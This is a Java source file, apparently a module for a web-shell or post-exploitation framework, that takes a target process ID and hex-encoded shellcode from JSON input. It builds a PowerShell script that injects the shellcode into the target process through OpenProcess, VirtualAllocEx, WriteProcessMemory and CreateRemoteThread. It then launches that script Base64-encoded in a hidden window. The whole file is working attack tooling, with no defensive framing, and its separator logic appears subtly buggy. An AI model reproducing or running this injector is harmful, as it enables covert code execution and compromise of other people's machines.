import java.io.*;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.naming.ldap.SortControl;
import java.nio.charset.StandardCharsets;

public class payload {
    public payload() {}

    private byte[] fnHexStringToByteArray(String szHexStr) {
        if (szHexStr == null || szHexStr.trim().isEmpty()) {
            return new byte[0];
        }

        String szClean = szHexStr.toLowerCase().replaceAll("[\\\\,ox\\s\\r\\n]", "");

        int nLen = szClean.length();
        if (nLen % 2 != 0) {
            szClean = szClean + "0";
            nLen++;
        }

        byte[] abResult = new byte[nLen / 2];
        for (int i = 0; i < nLen; i += 2) {
            String szByteHex = szClean.substring(i, i + 2);
            abResult[i / 2] = (byte) Integer.parseInt(szByteHex, 16);
        }

        return abResult;
    }

    public String Execute(Object param) throws Exception {
        try {
            if (!(param instanceof java.util.Map)) {
                return "ERROR: Invalid parameter type. Expected Map.";
            }
            java.util.Map<?, ?> mapParam = (java.util.Map<?, ?>) param;
            String szJson = (String) mapParam.get("json");

            if (szJson == null || szJson.isEmpty()) {
                return "ERROR: JSON data is empty.";
            }

            String szStrategy = fnGetJsonValue(szJson, "strategy");
            String szPid = fnGetJsonValue(szJson, "target_pid");
            String szPayload = fnGetJsonValue(szJson, "payload_hex");

            int nPid = 0;
            if (!szPid.isEmpty()) {
                try {
                    nPid = Integer.parseInt(szPid);
                } catch (NumberFormatException e) {
                    // do something
                }
            }

            byte[] abShellcode = fnHexStringToByteArray(szPayload);
            if (abShellcode.length == 0) {
                return "ERROR: Shellcode payload is empty or invalid hex value";
            }

            StringBuilder result = new StringBuilder();
            result.append("Parsed Configuration:\n")
                  .append("- Strategy: ").append(szStrategy).append("\n")
                  .append("- Target PID: ").append(szPid).append("\n")
                  .append("- Shellcode Size: ").append(abShellcode.length).append(" bytes\n");

            if (szStrategy.equalsIgnoreCase("remote_thread")) {
                StringBuffer sb = new StringBuffer();
                for (int i = 0; i < abShellcode.length; i++) {
                    sb.append(String.format("0x%02x", abShellcode[i]));
                    if (i < abShellcode.length - i)
                        sb.append(",");
                }

                // Call Win32 APIs via PowerShell
                String psScript = 
                    "$Kernel32 = @'\n" +
                    "[DllImport(\"kernel32.dll\")]\n" +
                    "public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);\n" +
                    "[DllImport(\"kernel32.dll\")]\n" +
                    "public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n" +
                    "[DllImport(\"kernel32.dll\")]\n" +
                    "public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);\n" +
                    "[DllImport(\"kernel32.dll\")]\n" +
                    "public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);\n" +
                    "[DllImport(\"kernel32.dll\")]\n" +
                    "public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n" +
                    "'@\n" +
                    "$WinAPI = Add-Type -MemberDefinition $Kernel32 -Name \"Win32API\" -Namespace \"Win32RemoteSC\" -PassThru\n" +
                    "\n" +
                    "[byte[]]$sc = @(" + sb.toString() + ")\n" +
                    "$nShellcodeSize = $sc.Length\n" +
                    "\n" +
                    "# OpenProcess (PROCESS_ALL_ACCESS = 0x001F0FFF)\n" +
                    "$procHandle = $WinAPI::OpenProcess(0x001F0FFF, $false, " + nPid + ")\n" +
                    "if ($procHandle -eq [IntPtr]::Zero) { exit }\n" +
                    "\n" +
                    "# VirtualAllocEx (MEM_COMMIT = 0x1000, PAGE_EXECUTE_READWRITE = 0x40)\n" +
                    "$init = $WinAPI::VirtualAllocEx($procHandle, [IntPtr]::Zero, $nShellcodeSize, 0x1000, 0x40)\n" +
                    "if ($init -ne [IntPtr]::Zero) {\n" +
                    "    $bytesWritten = 0\n" +
                    "    # WriteProcessMemory\n" +
                    "    $success = $WinAPI::WriteProcessMemory($procHandle, $init, $sc, $nShellcodeSize, [ref]$bytesWritten)\n" +
                    "    if ($success -and $bytesWritten -gt 0) {\n" +
                    "        # VirtualProtectEx (PAGE_EXECUTE_READ = 0x20)\n" +
                    "        $oldProtect = 0\n" +
                    "        $WinAPI::VirtualProtectEx($procHandle, $init, $nShellcodeSize, 0x20, [ref]$oldProtect) | Out-Null\n" +
                    "        \n" +
                    "        # CreateRemoteThread\n" +
                    "        $WinAPI::CreateRemoteThread($procHandle, [IntPtr]::Zero, 0, $init, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null\n" +
                    "    }\n" +
                    "}\n";

                byte[] abUTF16Bytes = psScript.getBytes("UTF-16LE");
                String szB64 = Base64.getEncoder().encodeToString(abUTF16Bytes);

                String[] asArgs = new String[] {
                    "powershell.exe",
                    "-NoProfile",
                    "-WindowStyle",
                    "Hidden",
                    "-EncodedCommand",
                    szB64
                };

                Runtime.getRuntime().exec(asArgs);
            }

            return result.toString();

        } catch (Exception e) {
            return "ERROR: " + e.toString();
        }
    }

    private String fnGetJsonValue(String json, String key) {
        Pattern pattern = Pattern.compile("\"" + key + "\"\\s*:\\s*\"(.*?)\"");
        Matcher matcher = pattern.matcher(json);
        if (matcher.find()) {
            return matcher.group(1);
        }
        
        pattern = Pattern.compile("\"" + key + "\"\\s*:\\s*([^,\\}\\]]+)");
        matcher = pattern.matcher(json);
        if (matcher.find()) {
            return matcher.group(1).trim();
        }

        return "";
    }
}